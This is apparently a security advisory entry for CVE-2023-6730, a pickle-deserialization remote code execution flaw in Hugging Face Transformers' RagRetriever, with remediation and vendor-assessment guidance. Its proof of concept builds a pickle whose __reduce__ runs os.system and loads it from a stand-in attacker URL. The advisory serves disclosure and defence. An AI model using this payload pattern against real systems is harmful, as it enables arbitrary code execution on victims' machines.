# CVE-2023-6730: Hugging Face Transformers RagRetriever Pickle RCE

## Quick Reference

| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2023-6730 |
| **Framework** | Hugging Face Transformers |
| **Affected Versions** | < 4.36.0 |
| **Fixed Version** | 4.36.0 |
| **CVSS Score** | 7.8 (High) |
| **CWE** | CWE-502 (Deserialization of Untrusted Data) |
| **Attack Vector** | Network (malicious index file) |
| **Disclosed** | 2023-12-19 |

## Summary

The Hugging Face Transformers library is vulnerable to remote code execution through the `RagRetriever.from_pretrained()` function. The `index_name` and `index_path` parameters can be manipulated to load malicious pickle files from remote locations, bypassing file validation checks and executing arbitrary code.

This vulnerability demonstrates how ML-specific features (retrieval-augmented generation) can introduce novel attack surfaces beyond traditional model loading.

## Technical Details

**Vulnerable Function:** `RagRetriever.from_pretrained()` in transformers

**Root Cause:** The RAG (Retrieval-Augmented Generation) retriever loads index files that can contain pickle data. The `index_name` and `index_path` parameters accept URLs or paths without adequate validation, allowing attackers to point to malicious pickle files.

**Attack Pattern:**
1. Attacker hosts a malicious pickle file on a remote server
2. Attacker tricks victim into loading a RAG model with a crafted `index_path` pointing to the malicious file
3. The retriever fetches and deserializes the pickle file
4. Arbitrary code executes on the victim's system

**Code Path:**
```python
# Vulnerable usage
from transformers import RagRetriever

# Attacker controls index_path
retriever = RagRetriever.from_pretrained(
    "facebook/rag-token-nq",
    index_name="custom",
    index_path="https://attacker.com/malicious.pkl"  # Malicious file
)
```

## Proof of Concept

The vulnerability allows bypassing the import blacklist and other security checks to load arbitrary pickle files.

```python
# Malicious pickle file on attacker's server
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned',))

with open('malicious.pkl', 'wb') as f:
    pickle.dump(Exploit(), f)

# Victim code
from transformers import RagRetriever
retriever = RagRetriever.from_pretrained(
    "facebook/rag-token-nq",
    index_name="custom",
    index_path="https://attacker.com/malicious.pkl"
)
# RCE occurs
```

## Remediation

### Immediate Actions

1. **Upgrade Transformers to 4.36.0 or later**
   ```bash
   pip install transformers>=4.36.0 --upgrade
   ```

2. **Audit RAG usage** - Review any code using `RagRetriever` or similar retrieval components

3. **Validate index sources** - Only load indices from trusted, controlled locations

### Long-term Mitigations

- Use safetensors format where possible
- Implement allowlists for remote resource URLs
- Consider disabling remote index loading in production environments

## GRC Implications

### Risk Assessment

**Risk Level:** High

**Impact Scenarios:**
- RAG-based applications (question answering, search) are vulnerable
- Applications that accept user-provided index paths are at highest risk
- Transitive attacks possible through seemingly innocuous model downloads

### Vendor Assessment Questions

When evaluating vendors using Hugging Face Transformers:

1. "What version of the transformers library do you use?"
2. "Do you use RAG (Retrieval-Augmented Generation) components?"
3. "How do you control what index files are loaded?"
4. "Do users/customers have any control over model or index paths?"
5. "Are you aware of pickle-related vulnerabilities in transformers (CVE-2023-6730, CVE-2023-7018, CVE-2024-3568)?"

### Unique Risk: Transitive Attacks

This CVE is notable for enabling "transitive attacks" - where downloading an apparently safe model triggers loading of a malicious secondary file. This makes the attack surface less obvious than direct model loading vulnerabilities.

### Control Recommendations

| Control | Description | Priority |
|---------|-------------|----------|
| Version upgrade | Upgrade transformers >= 4.36.0 | Critical |
| URL validation | Allowlist permitted remote sources | High |
| Disable remote loading | Use local-only index files in production | High |
| Code review | Audit all `from_pretrained()` calls | Medium |

## References

- [Snyk Advisory SNYK-PYTHON-TRANSFORMERS-6135747](https://security.snyk.io/vuln/SNYK-PYTHON-TRANSFORMERS-6135747)
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2023-6730)
- [Hugging Face Security Documentation](https://huggingface.co/docs/hub/en/security-pickle)

## Timeline

| Date | Event |
|------|-------|
| 2023-12-19 | CVE assigned and disclosed |
| 2023-12-XX | Transformers 4.36.0 released with fix |

## Related Vulnerabilities

- [CVE-2023-7018](CVE-2023-7018.md) - TransfoXLTokenizer pickle loading (same library)
- [CVE-2024-3568](CVE-2024-3568.md) - TFPreTrainedModel.load_repo_checkpoint
- [CVE-2024-11393](CVE-2024-11393.md) - MaskFormer model parsing

---

*Last updated: 2026-01-18*

*Tags: `huggingface` `transformers` `rag` `retriever` `high` `rce` `transitive-attack`*
